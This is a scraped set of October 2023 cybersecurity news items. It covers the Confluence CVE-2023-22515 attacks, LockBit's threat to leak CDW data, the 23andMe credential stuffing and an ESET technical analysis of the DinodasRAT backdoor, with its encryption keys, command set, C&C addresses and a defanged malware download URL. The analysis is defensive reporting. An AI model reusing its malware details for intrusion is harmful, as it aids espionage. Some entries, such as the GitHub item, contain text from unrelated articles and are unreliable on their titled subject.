      "text": " Atlassian today said miscreants have exploited a critical bug in on-premises instances of Confluence Server and Confluence Data Center to create and abuse admin accounts within the enterprise colab software.  The privilege-escalation vulnerability, tracked as CVE-2023-22515, affects versions 8.0.0 through 8.5.1. Versions prior to 8.0.0 are not impacted by the flaw. Our reading of the details is that public-facing instances are potentially in danger: anyone who can reach a vulnerable deployment can attempt to exploit it and gain admin-level access. Some customers have already been hit via this zero-day vulnerability, and updates are now available to shore up installations.\"Instances on the public internet are particularly at risk, as this vulnerability is exploitable anonymously.\"A spokesperson declined to answer specific comments about the vulnerability, and how many customers were compromised, though did confirm Atlassian Cloud sites are not impacted.\"We have provided customers with details of affected versions, mitigation steps required and threat detection actions in our critical security advisory,\" the spokesperson told The Register.In addition to updating to fixed versions of the software, Atlassian urged customers to apply mitigation measures. These include restricting external network access to instances. Admins can also mitigate known attack vectors by not allowing access to the /setup/* endpoints on Confluence instances. Condon also said it's \"unusual\" but \"not unprecedented\" for a privilege-escalation vulnerability to earn a critical severity rating. In this case, it appears to be a unauthenticated remote elevation-of-privilege hole, allowing miscreants to create their own admin accounts to use, which would be bad.\"Atlassian's advisory implies that the vulnerability is remotely exploitable, which is typically more consistent with an authentication bypass or remote code execution chain than a privilege escalation issue by itself,\" Condon said. \"It's possible that the vulnerability could allow a regular user account to elevate to admin — notably, Confluence allows for new user sign-ups with no approval, but this feature is disabled by default.\"More details, and likely victims, will undoubtedly emerge in the coming days, and we'll be keeping a close eye on this vulnerability. Stay tuned. ®The Register   Biting the hand that feeds IT\n                        Copyright. All rights reserved © 1998–2023\n\n                    "
   },
   {
      "time": "2023-10-09",
      "title": "North Korea's Lazarus Group Launders $900 Million in Cryptocurrency",
      "text": " As much as $7 billion in cryptocurrency has been illicitly laundered through cross-chain crime, with the North Korea-linked Lazarus Group linked to the theft of roughly $900 million of those proceeds between July 2022 and July of this year.Cross-chain crime refers to the conversion of crypto assets from one token or blockchain to another, often in rapid succession, in an attempt to obfuscate their origin, making it a lucrative method for money laundering for crypto thefts and an alternative to traditional approaches like mixers.According to data gathered by Elliptic, the Lazarus Group's use of cross-chain bridges contributed to a majority of the 111% increase in the proportion of funds sent via such services.The threat actor has also been linked to the use of Avalanche Bridge to deposit more than 9,500 bitcoin, while simultaneously employing cross-chain solutions to move some of the plundered assets.\"As is evidenced by the assets ending up on the same blockchain on numerous occasions, these transactions have no legitimate business purpose other than to obfuscate their origin,\" Elliptic said. \"Bridging back-and-forth for the sake of obfuscation – i.e. 'chain-hopping' – is now a recognized money laundering typology.\"The disclosure comes as South Korea's National Intelligence Service (NIS) has warned of North Korea attacking its shipbuilding sector since the start of the year.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-09",
      "title": "GitHub's Secret Scanning Feature Now Covers AWS, Microsoft, Google, and Slack",
      "text": " The cloud-based code hosting and version control service said it intends to support more tokens in the future.To toggle the setting, enterprise or organization owners and repository administrators can head to Settings > Code security and analysis > Secret scanning and check the option \"Automatically verify if a secret is valid by sending it to the relevant partner.\"\"These attempts, if successful, may allow a threat actor to gain access to MFA authentication credentials or bypass MFA and access the MFA-protected systems.\"The other prevalent cybersecurity misconfigurations are as follows -As mitigations, it's recommended that organizations eliminate default credentials and harden configurations; disable unused services and implement access controls; prioritize patching; audit and monitor administrative accounts and privileges.\"These misconfigurations illustrate (1) a trend of systemic weaknesses in many large organizations, including those with mature cyber postures, and (2) the importance of software manufacturers embracing secure-by-design principles to reduce the burden on network defenders,\" the agencies noted.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-08",
      "title": "Android Devices With Backdoored Firmware Found in US Schools - SecurityWeek",
      "text": " Hi, what are you looking for?A global cybercriminal operation called BadBox has infected the firmware of more than 70,000 Android smartphones, CTV boxes, and tablets with the Triada malware.ByFlipboardRedditWhatsappWhatsappEmailIonut Arghire is an international correspondent for SecurityWeek.Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.Join security experts as they discuss ZTNA’s untapped potential to both reduce cyber risk and empower the business.Join Microsoft and Finite State for a webinar that will introduce a new strategy for securing the software supply chain. FlipboardRedditWhatsappWhatsappEmailThe changing nature of what we still generally call ransomware will continue through 2023, driven by three primary conditions.As it evolves, web3 will contain and increase all the security issues of web2 – and perhaps add a few more.A recently disclosed vBulletin vulnerability, which had a zero-day status for roughly two days last week, was exploited in a hacker attack targeting the...Luxury retailer Neiman Marcus Group informed some customers last week that their online accounts had been breached by hackers.Zendesk is informing customers about a data breach that started with an SMS phishing campaign targeting the company’s employees.Satellite TV giant Dish Network confirmed that a recent outage was the result of a cyberattack and admitted that data was stolen.The release of OpenAI’s ChatGPT in late 2022 has demonstrated the potential of AI for both good and bad.A new study by McAfee and the Center for Strategic and International Studies (CSIS) named a staggering figure as the true annual cost of...Got a confidential news tip? We want to hear from you.Reach a large audience of enterprise cybersecurity professionals Subscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inbox.Copyright © 2023 SecurityWeek ®, a Wired Business Media Publication. All Rights Reserved. \n\n"
   },
   {
      "time": "2023-10-08",
      "title": "LockBit says CDW data will be leaked after talks break down • The Register",
      "text": " CDW, one of the largest resellers on the planet, will have its data leaked by LockBit after negotiations over the ransom fee broke down, a spokesperson for the cybercrime gang says.Speaking to The Register, the spokesperson, who uses the alias LockBitSupp, implied that during negotiations CDW offered a sum that was so low it insulted the crooks.\"We published them because in the negotiation process a $20 billion company refuses to pay adequate money,\" the source said.\"As soon as the timer runs out you will be able to see all the information, the negotiations are over and are no longer in progress. We have refused the ridiculous amount offered.\"LockBit did not respond to questions relating to what its original ransom demand was or what CDW offered in the negotiations. It also shirked questions concerning the nature of the data stolen and what methods it used to breach the company.According to the countdown timer on LockBit's victim blog, CDW's files are scheduled to be published in the early hours of the morning on October 11.CDW has yet to comment on the incident, which appears to have been ongoing since at least September 3, when the company was first posted to LockBit's blog.The Register has contacted CDW for clarity but the company has not offered a response.Its automatic email reply reads: \"Thank you for contacting CDW. Your inquiry has been received and will be reviewed. Should there be a fit or an interest in engaging further, we will be in touch as soon as possible.\"The UK Information Commissioner's Office (ICO) confirmed that it had not received a breach report from CDW.Cybersecurity analyst and researcher Dominic Alvieri said the company was technically posted to LockBit's blog three times in total. It was originally \"flashed\" – a tactic involving the quick posting and deletion of a company to encourage a fast response from the victim.\"When deadlines come and go it is a sign the company is negotiating or has at least acknowledged the incident,\" he said.\"The repost is usually the final stages. The ransoms process can take weeks/months.\"Posting a company to a victim blog multiple times isn't something that happens in every case but it is a known aggressive tactic adopted by ransomware groups to hurry negotiations, experts told The Register.\"Ransomware groups are ramping up their tactics in forcing victims to pay quickly and this is all part of their business model to extort more money in a timely fashion from their targets,\" said Jake Moore, global cybersecurity advisor at ESET. \"There is always a chance, however, that this is a tactic used to force their victims' hands to act quickly yet no real substance be in the original claim.\"This is the common gamble played between cybercriminals and their victims where one wrong move and a poker face could cost companies huge amounts in ransom payments and more problems thereafter from leaked data in public view.\"The deadline was set for February 13 and no data was published. A day later, instead of making Royal Mail International's stolen data public, LockBit posted the full negotiation history between it and the company in the form of a downloadable chat log.The chat logs revealed the ransom demand was originally set at $80 million, later offering a 50 percent discount after the company branded the demands \"absurd.\"At the time, the release of the chat logs was seen as an example of these scare tactics. After Royal Mail's continued refusal to pay, LockBit eventually staggered the publication of its data, much of which included employee information, in 10 separate dumps.In the Royal Mail negotiations, the transcript shows the negotiator attempting to convince LockBit to hand over two files as proof the criminals' decryptor worked.LockBit realized after a few days that the two files would have allowed Royal Mail to fully recover its systems without paying for the decryptor.Towards the end of the negotiations, where Royal Mail appeared to stall LockBit for as long as it could by saying it was waiting for its board to decide on whether to pay the discounted ransom fee, LockBit grew frustrated with the tactics and published the data after days on non-responsiveness from Royal Mail.Over the years, LockBit has been accused of orchestrating various \"PR stunts\" to cause confusion and raise its notoriety level.These have included \"fake\" ransomware attacks on large organizations, posting their details to LockBit's website along with a countdown timer to indicate the publication date of the stolen files, just as it does with genuine victims.One such example came in June 2022, when it claimed to have breached incident response specialists Mandiant. In typical fashion, the countdown timer spent days reaching zero, and what was published wasn't the data it claimed to have stolen from the company, but instead a response to claims that the group was linked to the sanctioned cybercrime outfit Evil Corp.\"Paying ransoms to these cyber threat groups is still not illegal in most countries; however, a formalized association with Evil Corp would render those payments potentially out of the law, with significant civil and criminal implications for the organizations involved in them. \"Given that LockBit is one of the most prolific ransomware groups in activity at the moment, it is likely that they intend to continue their highly successful and profitable ransomware operations for the following months.\"LockBit repeated the same trick later that year, this time against French multinational IT company Thales. Although in Thales's case, it was only half fibbing.At the time, Thales's public statements repeatedly denied evidence of an IT intrusion, but on November 10, 2022 – three days after LockBit promised to publish its data – Thales confirmed that data had been stolen and published.However, it said the theft was carried out by \"two likely sources,\" one of which was \"confirmed through the user account of a partner on a dedicated collaboration portal,\" and the other was unknown. ®The Register   Biting the hand that feeds IT\n                        Copyright. All rights reserved © 1998–2023\n\n                    "
   },
   {
      "time": "2023-10-08",
      "title": "Sony confirms over 6,000 current and former employees have been impacted by cyber-attacks – Destructoid",
      "text": " darkSony isn’t the only victim. As reported by Bleeping Computer, Sony Interactive Entertainment sent a notification to around 6,800 former and current employees informing them that a cybersecurity breach had exposed their personal information. It is believed that the breach occurred on May 28 when an “unauthorized party exploited a zero-day vulnerability in the MOVEit Transfer platform.” According to Sony, the cyber-attack did not affect any of its other systems. It also appears that no customer data has been affected, though this isn’t the only problem Sony has to worry about. It also suffered a data breach on a single server in Japan. Latest FeaturesSuper Smash T.V. for SNES is a great way to unwind after a crappy weekUnity warns of likely layoffs following runtime fee decisionValve announces the Steam Deck OLEDReview: Warcraft RumbleThe most embarrassing games Psycho Mantis could have called out on my PS1 memory cardLatest ReviewsReview: Warcraft RumbleReview: Berzerk: RechargedReview: Air TwisterReview: Like a Dragon Gaiden: The Man Who Erased His NameReview: Alan Wake 2Review: WarioWare: Move It!Review: Star Ocean: The Second Story RReview: JusantReview: RoboCop: Rogue CityReview: Song of Nunu: A League of Legends Story"
   },
   {
      "time": "2023-10-08",
      "title": "23andMe User Data Targeting Jews Stolen And Listed For Sale | The Daily Caller",
      "text": " Photo by ERIC BARADAT/AFP via Getty ImagesGenomics company 23andMe confirmed Friday that a sample containing 1 million user data points was stolen and listed for sale, Forbes reported.The attackers reportedly utilized recycled password attacks to guess login information of a subset of users. They then accessed additional data through a feature which allows users to share information with others, the outlet noted.“We do not have any indication at this time that there has been a data security incident within our systems. The login credentials used in these access attempts may have been gathered by a threat actor from data leaked during incidents involving other online platforms where users have recycled login credentials,” a spokesperson for 23andMe told Forbes.©2023 The Daily Caller, Inc.The Daily Caller | 1775 Eye Street NW | Suite 1150-290 | Washington, DC 20006"
   },
   {
      "time": "2023-10-08",
      "title": "Operation Jacana: Foundling hobbits in Guyana",
      "text": " \n      Award-winning news, views, and insight from the ESET security community\n    \n        Award-winning news, views, and insight from the ESET security community\n      ESET ResearchESET researchers discovered a cyberespionage campaign against a governmental entity in Guyana\n05 Oct 2023\n • \n, \n15 min. read\nIn February 2023, ESET researchers detected a spearphishing campaign targeting a governmental entity in Guyana. While we haven’t been able to link the campaign, which we named Operation Jacana, to any specific APT group, we believe with medium confidence that a China-aligned threat group is behind this incident.In the attack, the operators used a previously undocumented C++ backdoor that can exfiltrate files, manipulate Windows registry keys, execute CMD commands, and more. We named the backdoor DinodasRAT based on the victim identifier it sends to its C&C: the string always begins with Din, which reminded us of the hobbit Dinodas from the Lord of the Rings.Key points of this blogpost:This campaign was targeted, as the threat actors crafted their emails specifically to entice their chosen victim organization. After successfully compromising the first couple of machines with DinodasRAT, the operators proceeded to move laterally and breach the target’s internal network, where they again deployed the DinodasRAT backdoor, along with additional malicious tools, among them a variant of Korplug (aka PlugX). The overview of the compromise flow in Operation Jacana is shown in Figure 1.While our attribution to a China-aligned threat actor is made with only medium confidence, the hypothesis is further supported by recent developments in Guyana–China diplomatic relations. In February 2023, the same month that Operation Jacana occurred, the Special Organised Crime Unit (SOCU) of Guyana arrested three people in a money laundering investigation involving Chinese companies, an act disputed by the local Chinese embassy. Additionally, as part of the Belt and Road Initiative, China has economic interests in Guyana. As the first step in breaching their victim’s network, the threat actors behind Operation Jacana sent the target organization spearphishing emails referencing Guyanese public affairs. We observed the following subject lines:The spearphishing emails contained a link that, when clicked, downloaded a ZIP file from https://fta.moit.gov[.]vn/file/people.zip. Since a domain ending with gov.vn indicates a Vietnamese governmental website, we believe that the operators were able to compromise another governmental entity and use it to host their malware samples. We have notified the VNCERT about the compromised infrastructure.Once the victim extracted the ZIP file, which wasn’t password protected, and launched the contained executable, they became compromised with the DinodasRAT malware. The extracted filenames are related to the phishing email subject lines:Some of the commands the attackers executed on the network include:DinodasRAT is a previously undocumented remote access trojan developed in C++ with various capabilities that allow an attacker to spy on and collect sensitive information from a victim’s computer. When executed, the malware first checks whether three arguments were passed. If present, these arguments must contain the following information in the following order:If all three arguments were passed, DinodasRAT terminates the process represented by the process ID using the Windows API TerminateProcess then uses the Windows API DeleteFileW to delete the file passed in the third argument. After this, the process stops its execution by using the C++ standard library exit function. This is most likely intended as an uninstall function.The Application Doc directory is created with the attributes Read-only and Hidden. Inside of Application Doc, DinodasRAT creates two subdirectories, named 0 and 1. Once the directory exists, the malware spawns three threads used for data collection and exfiltration. A detailed description of their behavior is given in Table 1.Table 1. Thread descriptions\n\n\nThread\nDescription\n\n\n\n\n1\n\nTake a screenshot of the display of the victim’s machine every five minutes using Windows API functions like CreateDCW, BitBlt, DeleteDC, or ReleaseDC. The screenshot is compressed and saved in the subdirectory Application Doc\\0.\nIn order to compress the screenshot, the attackers use the zlib library, version 1.2.11.\nThe format of the filename used for the saved screenshots is the following: <YYYYMMDDHHMMSS>_<five random digits>_<one random digit>.jpg\n\n\n\n2\n\nGet the content of the clipboard every five minutes using the Windows API function GetClipboardData and save it in the subdirectory Application Doc\\1.\nThe format of the filename used for the clipboard data file is the following: DateTimeStamp_<five random digits>_<one random digit>.txt\n\n\n\n3\nLoops through the subdirectories 0 and 1 and sends the filenames, encrypted with TEA and base64 encoded, to the C&C server. If the C&C server replies, it creates another packet in order to send the filename with its data. Finally, it deletes the file from the victim’s machine.\n\n\nTake a screenshot of the display of the victim’s machine every five minutes using Windows API functions like CreateDCW, BitBlt, DeleteDC, or ReleaseDC. The screenshot is compressed and saved in the subdirectory Application Doc\\0.In order to compress the screenshot, the attackers use the zlib library, version 1.2.11.The format of the filename used for the saved screenshots is the following: <YYYYMMDDHHMMSS>_<five random digits>_<one random digit>.jpgGet the content of the clipboard every five minutes using the Windows API function GetClipboardData and save it in the subdirectory Application Doc\\1.The format of the filename used for the clipboard data file is the following: DateTimeStamp_<five random digits>_<one random digit>.txtAfter the threads are spawned, DinodasRAT creates a file named conf.ini in the main directory. This file contains an ID used to identify the victim to the C&C server. Figure 2 shows an example of the ID saved in the conf.ini file.The format of the ID is Din_<YYYYMMDD>_<MD5-HASH>_<RANDOM-VALUE>_V1, where:We found that the malware contains three different keys used for different encryption/decryption scenarios, as described in Table 2.Table 2. TEA keys used by DinodasRAT\n\n\nKey N\nValue\nDescription\n\n\n\n\n1\nA1 A1 18 AA 10 F0 FA 16 06 71 B3 08 AA AF 31 A1\nUsed mainly to encrypt/decrypt communications with the C&C server.\n\n\n2\nA0 21 A1 FA 18 E0 C1 30 1F 9F C0 A1 A0 A6 6F B1\nUsed to encrypt the name of the files created in the screenshot functionality, before they are sent to the C&C server.\n\n\n3\n11 0A A8 E1 C0 F0 FB 10 06 71 F3 18 AC A0 6A AF\nUsed to decrypt the installation paths.\n\n\nIn order to communicate with the C&C server, DinodasRAT uses the Winsock library to create a socket that uses the TCP protocol. Although TCP is the default protocol used to send and receive information from the C&C server, we have seen that DinodasRAT is capable of changing to the UDP protocol.The backdoor also creates various threads for different purposes, such as manipulating a received command to execute on the victim’s machine. Hence, in order to maintain synchronized communication, DinodasRAT makes use of Windows event objects by using Windows API functions like CreateEventW, SetEventW, and WaitForSingleObject.To start the main communication with the C&C server, DinodasRAT sends a packet with basic information about the victim’s machine and its configuration, such as:Figure 3 shows not only basic information collected about the victim, but also the ID generated by the malware, which serves as a victim identifier for the C&C server.All the information that DinodasRAT sends to the C&C server via the TCP protocol is TEA encrypted. In addition to that, some of the information is also base64 encoded.To send the stolen information to the C&C server, DinodasRAT crafts a packet containing the following:Figure 4 shows an example of an encrypted packet to be sent to the C&C server.During our analysis we were unable to obtain a response from the C&C server, but we were able to determine that any packets received from the server should also be encrypted with TEA.When it comes to handling commands received from the C&C server, DinodasRAT creates a thread with an infinite loop responsible for receiving and determining whether packets contain encrypted commands to execute.A packet, once decrypted, contains the following structure:DinodasRAT contains commands capable of performing various actions on a victim’s machine or on the malware itself. Table 3 lists the supported commands with a short description of each. Table 3. DinodasRAT commands\n\n\n\nCommand ID\n\n\nDescription\n\n\n\n\n\n\n0x02\n\n\nList the contents of a specific directory.\n\n\n\n\n0x03\n\n\nDelete a file or the content of a directory.\n\n\n\n\n0x04\n\n\nChange the attribute of a file to hidden or normal.\n\n\n\n\n0x05\n\n\nSend files to the C&C server.\n\n\n\n\n0x06\n\n\nSet an event object used for command 0x05.\n\n\n\n\n0x08\n\n\nModify a binary file with bytes received from the C&C server or execute a command using CreateProcessW.\n\n\n\n\n0x09\n\n\nSet an event object used for command 0x08.\n\n\n\n\n0x0D\n\n\nWrite a variable called va, with its value, in the conf.ini file.\n\n\n\n\n0x0E\n\n\nEnumerate running processes.\n\n\n\n\n0x0F\n\n\nTerminate a process by its process ID.\n\n\n\n\n0x10\n\n\nList services on the victim’s machine.\n\n\n\n\n0x11\n\n\nStart or delete a service.\n\n\n\n\n0x12\n\n\nGet info from a Windows registry key.\n\n\n\n\n0x13\n\n\nDelete a Windows registry key.\n\n\n\n\n0x14\n\n\nCreate a Windows registry key.\n\n\n\n\n0x15\n\n\nExecute a file or a command using the CreateProcessW Windows API.\n\n\n\n\n0x16\n\n\nExecute a command using the CreateProcessW Windows API.\n\n\n\n\n0x17\n\n\nReceive a domain and execute nslookup with that domain to create another socket with the IP address.\n\n\n\n\n0x18\n\n\nReceive and execute a command using Windows APIs CreateProcessW, PeekNamedPipe, and ReadFile.\n\n\n\n\n0x19\n\n\nSame as command 0x18.\n\n\n\n\n0x1A\n\n\nSet an event object used for commands 0x18, 0x19, and 0x1B.\n\n\n\n\n0x1B\n\n\nInteractive reverse shell.\n\n\n\n\n0x1D\n\n\nFile manipulation; rename, copy, move files, etc.\n\n\n\n\n0x1E\n\n\nSet the string ok to a global variable and send that value to the C&C server.\n\n\n\n\n0x1F\n\n\nWrite a variable called mode with its value into the conf.ini file.\n\n\n\n\n0x20\n\n\nWrite a variable called ptype with its value into the conf.ini file.\n\n\n\n\n0x21\n\n\nGet or set a variable called fmode with its value in the conf.ini file.\n\n\n\n\n0x22\n\n\nTerminate malware execution.\n\n\n\n\n0x24\n\n\nWrite the variables s and sub, with their respective values, into a file named p.ini. Both variables can have a Boolean value of true or false.\n\n\n\n\n0x25\n\n\nConfigurate the event and global variables related with the take screenshot thread.\n\n\n\n\n0x26\n\n\nWrite a variable called c with its value into a file named p.ini.\n\n\n\n\n0x29\n\n\nModify the value of a global variable used for the UDP protocol, default value 0x800.\n\n\n\nCommand IDDescription0x02List the contents of a specific directory.0x03Delete a file or the content of a directory.0x04Change the attribute of a file to hidden or normal.0x05Send files to the C&C server.0x06Set an event object used for command 0x05.0x08Modify a binary file with bytes received from the C&C server or execute a command using CreateProcessW.0x09Set an event object used for command 0x08.0x0DWrite a variable called va, with its value, in the conf.ini file.0x0EEnumerate running processes.0x0FTerminate a process by its process ID.0x10List services on the victim’s machine.0x11Start or delete a service.0x12Get info from a Windows registry key.0x13Delete a Windows registry key.0x14Create a Windows registry key.0x15Execute a file or a command using the CreateProcessW Windows API.0x16Execute a command using the CreateProcessW Windows API.0x17Receive a domain and execute nslookup with that domain to create another socket with the IP address.0x18Receive and execute a command using Windows APIs CreateProcessW, PeekNamedPipe, and ReadFile.0x19Same as command 0x18.0x1ASet an event object used for commands 0x18, 0x19, and 0x1B.0x1BInteractive reverse shell.0x1DFile manipulation; rename, copy, move files, etc.0x1ESet the string ok to a global variable and send that value to the C&C server.0x1FWrite a variable called mode with its value into the conf.ini file.0x20Write a variable called ptype with its value into the conf.ini file.0x21Get or set a variable called fmode with its value in the conf.ini file.0x22Terminate malware execution.0x24Write the variables s and sub, with their respective values, into a file named p.ini. Both variables can have a Boolean value of true or false.0x25Configurate the event and global variables related with the take screenshot thread.0x26Write a variable called c with its value into a file named p.ini.0x29Modify the value of a global variable used for the UDP protocol, default value 0x800.During our investigation we have seen only the creation and use of the ID variable with its respective value in the conf.ini file, which is used to indicate the victim to the C&C server.Additionally, DinodasRAT makes use of a multipurpose global variable which, for example, can contain the path of a filename to be deleted or the name of a Windows registry subkey to create.The attackers also used other tools apart from DinodasRAT during the intrusion:Operation Jacana is a cyberespionage campaign that impacted a governmental entity in Guyana. We believe with medium confidence that it was conducted by a China-aligned APT group.The attackers used a combination of previously unknown tools, such as DinodasRAT, and more traditional backdoors such as Korplug.Based on the spearphishing emails used to gain initial access to the victim’s network, the operators are keeping track of the geopolitical activities of their victims to increase the likelihood of their operation's success.\n\n\n\nSHA-1\n\n\nFilename\n\n\nESET detection name\n\n\nDescription\n\n\n\n\n\n\n599EA9B26581EBC7B4BDFC02E6C792B6588B751E\n\n\nPresident Mohamed Irfaan Ali's Official Visit to Nassau, The Bahamas.doc.exe\n\n\nWin32/DinodasRAT.A\n\n\nDinodasRAT.\n\n\n\n\nEFD1387BB272FFE75EC9BF5C1DD614356B6D40B5\n\n\npeople.zip\n\n\nWin32/DinodasRAT.A\n\n\nZIP file containing DinodasRAT.\n\n\n\n\n9A6E803A28D27462D2DF47B52E34120FB2CF814B\n\n\nPresident Mohamed Irfaan Ali's Official Visit to Nassau, The Bahamas.exe\n\n\nWin32/DinodasRAT.B\n\n\nDinodasRAT.\n\n\n\n\n33065850B30A7C797A9F1E5B219388C6991674DB\n\n\n114.exe\n\n\nWin32/DinodasRAT.B\n\n\nDinodasRAT.\n\n\n\nSHA-1FilenameESET detection nameDescription599EA9B26581EBC7B4BDFC02E6C792B6588B751EPresident Mohamed Irfaan Ali's Official Visit to Nassau, The Bahamas.doc.exeWin32/DinodasRAT.ADinodasRAT.EFD1387BB272FFE75EC9BF5C1DD614356B6D40B5people.zipWin32/DinodasRAT.AZIP file containing DinodasRAT.9A6E803A28D27462D2DF47B52E34120FB2CF814BPresident Mohamed Irfaan Ali's Official Visit to Nassau, The Bahamas.exeWin32/DinodasRAT.BDinodasRAT.33065850B30A7C797A9F1E5B219388C6991674DB114.exeWin32/DinodasRAT.BDinodasRAT.\n\n\n\nIP\n\n\nDomain\n\n\nHosting provider\n\n\nFirst seen\n\n\nDetails\n\n\n\n\n\n\n23.106.122[.]5\n\n\nN/A\n\n\nLeaseweb Asia Pacific pte. ltd.\n\n\n2023‑03‑29\n\n\nHosts other malicious components.\n\n\n\n\n23.106.122[.]46\n\n\nN/A\n\n\nIRT-LSW-SG\n\n\n2023‑02‑13\n\n\nHosts other malicious components.\n\n\n\n\n23.106.123[.]166\n\n\nN/A\n\n\nLeaseweb Asia Pacific pte. ltd.\n\n\n2023‑02‑15\n\n\nHosts other malicious components.\n\n\n\n\n42.119.111[.]97\n\n\nfta.moit.gov[.]vn\n\n\nFPT Telecom Company\n\n\n2023‑02‑13\n\n\nHosts DinodasRAT in a compressed file.\n\n\n\n\n115.126.98[.]204\n\n\nN/A\n\n\nForewin Telecom Group Limited, ISP at, HK\n\n\n2023‑05‑08\n\n\nC&C server for DinodasRAT.\n\n\n\n\n118.99.6[.]202\n\n\nN/A\n\n\nEdward Poon\n\n\n2023‑02‑02\n\n\nC&C server for DinodasRAT.\n\n\n\n\n199.231.211[.]19\n\n\nupdate.microsoft-setting[.]com\n\n\nDash Networks Inc.\n\n\n2022‑11‑07\n\n\nC&C server for DinodasRAT.\n\n\n\nIPDomainHosting providerFirst seenDetails23.106.122[.]5N/ALeaseweb Asia Pacific pte. ltd.2023‑03‑29Hosts other malicious components.23.106.122[.]46N/AIRT-LSW-SG2023‑02‑13Hosts other malicious components.23.106.123[.]166N/ALeaseweb Asia Pacific pte. ltd.2023‑02‑15Hosts other malicious components.42.119.111[.]97fta.moit.gov[.]vnFPT Telecom Company2023‑02‑13Hosts DinodasRAT in a compressed file.115.126.98[.]204N/AForewin Telecom Group Limited, ISP at, HK2023‑05‑08C&C server for DinodasRAT.118.99.6[.]202N/AEdward Poon2023‑02‑02C&C server for DinodasRAT.199.231.211[.]19update.microsoft-setting[.]comDash Networks Inc.2022‑11‑07C&C server for DinodasRAT.TacticIDNameDescriptionResource DevelopmentAcquire Infrastructure: Virtual Private ServerOperators have used VPS servers for hosting their payloads.Develop Capabilities: MalwareOperators made custom malware for the operation.Stage Capabilities: Upload MalwareOperators have used servers to upload malware.Compromise Infrastructure: ServerOperators have compromised servers to host their payloads.Obtain Capabilities: MalwareOperators have used a variant of the Korplug backdoor in this operation.Obtain Capabilities: ToolInitial AccessPhishing: Spearphishing LinkOperators made use of scheduled tasks to persist their malware.ExecutionCommand and Scripting Interpreter: PowerShellOperators have used PowerShell to execute commands on the victim’s network.Command and Scripting Interpreter: Windows Command ShellOperators have used Windows command shell to execute commands on the victim’s internal network.Command and Scripting Interpreter: Visual BasicOperators have used VBScripts.Native APIDinodasRAT uses APIs, e.g., CreateProcessW, to execute CMD commands on the victim’s machine.User Execution: Malicious LinkOperators have relied on their victims to open a link to download their malware.User Execution: Malicious FileOperators have relied on their victims to execute their malware.Defense EvasionDeobfuscate/Decode Files or InformationDinodasRAT compresses files before they are sent to the C&C server.DinodasRAT also uses TEA to decrypt strings.Masquerading: Double File ExtensionOperators have used “double extensions” to trick victims into executing their malware.Indicator Removal: File DeletionDinodasRAT is capable of self-deletion from the victim’s machine.Hide Artifacts: Hidden Files and DirectoriesTo evade detection, DinodasRAT creates hidden folders.PersistenceValid Accounts: Domain AccountsOperators have created domain accounts to maintain persistent access to the victim’s internal network.Scheduled Task/JobOperators made use of scheduled tasks to persist their malware.Credential AccessOS Credential Dumping: NTDSOperators abused ntdsutil.exe to dump credentials.DiscoveryFile and Directory DiscoveryDinodasRAT can list the contents of a directory or a file.Query RegistryDinodasRAT can obtain information from Windows registry keys.Process DiscoveryDinodasRAT can obtain information about the processes running on the victim’s machine.System Service DiscoveryDinodasRAT can obtain information about the services running on the victim’s machine.System Information DiscoveryDinodasRAT retrieves information like Windows version from the victim’s machine.CollectionClipboard DataDinodasRAT can obtain information located on the clipboard of the victim’s machine.Screen CaptureDinodasRAT can take screenshots on the victim’s machine.Command and ControlEncrypted Channel: Symmetric CryptographyDinodasRAT has used TEA for encrypting C&C server communications.Non-Application Layer ProtocolDinodasRAT has used TCP or UDP protocols for its connection to the C&C server.Data EncodingDinodasRAT uses base64 encoding for strings and data sent to its C&C server.ExfiltrationExfiltration Over C2 ChannelDinodasRAT exfiltrates data over the same channel used for its C&C server.\n      Sign up for our newsletters\n    ESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-BaltistanESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-Baltistan • ESET ResearchWho killed Mozi? Finally putting the IoT zombie botnet in its graveESET ResearchWho killed Mozi? Finally putting the IoT zombie botnet in its grave • ESET Research, Threat ReportsESET APT Activity Report Q2–Q3 2023ESET Research, Threat ReportsESET APT Activity Report Q2–Q3 2023 • ESET researchMustang Panda’s Hodur: Old tricks, new Korplug variantESET researchOkrum: Ke3chang group targets diplomatic missionsESET researchUnmasking MirrorFace: Operation LiberalFace targeting Japanese political entitiesESET researchYou never walk alone: The SideWalk backdoor gets a Linux variantESET researchThe SideWalk may be as dangerous as the CROSSWALK\n            Award-winning news, views, and insight from the ESET security community\n          "
   },
   {
      "time": "2023-10-08",
      "title": "Hackers Abuse Teams To Gain Access & Deploy Ransomware",
      "text": "  In the past, it has been accused of disseminating phishing emails to employ remote code execution to acquire initial access to infected systems.Trellix stated that the most recent iteration of the delivery technique targets professionals who use Teams IM as their primary chat box, which has enabled EXTERNAL user communication with certain luring phishing messages along with attachments that result in a ransom attack on the associated devices in the network.Implementing AI-Powered Email security solutions “Trustifi” can secure your business from today’s most dangerous email threats, such as Email Tracking, Blocking, Modifying, Phishing, Account Take Over, Business Email Compromise, Malware & RansomwareThe user would then be sent to the SharePoint site, where the compressed WSF (Windows Script File)/JS delivers a malicious .Net payload JSSLoader. The threat actor has thus far employed a variety of file formats, including Windows Script Files (WSF), Microsoft Office Documents, and VBS.The FIN7/Sagrid threat actor created JSSLoader, a very sophisticated backdoor that has the following features:The payload creates a unique ID of the target based on the serial number, domain name, and computer name to track down the victim or target.As a RAT (remote access trojan), the malware gathers the victim data listed to prepare for the next stage of execution:Since 2019, JSSLoader has constantly changed, and this threat’s distribution mode has evolved. Researchers say these features a new approach to Teams-based phishing attacks using GitHub scripts, which leads to script kiddies getting their hands dirty.Hence, with the creation of JSSLoader in C++, it was possible to avoid detection and complicated analysis.In the upcoming webinar, Karthik Krishnamoorthy, CTO and Vivek Gopalan, VP of Products at Indusface demonstrate how APIs could be hacked.The session will cover:an exploit of OWASP API Top 10 vulnerability,\na brute force account take-over (ATO) attack on API,\na DDoS attack on an API,\nhow a WAAP could bolster security over an API gatewayStay safe online with free daily 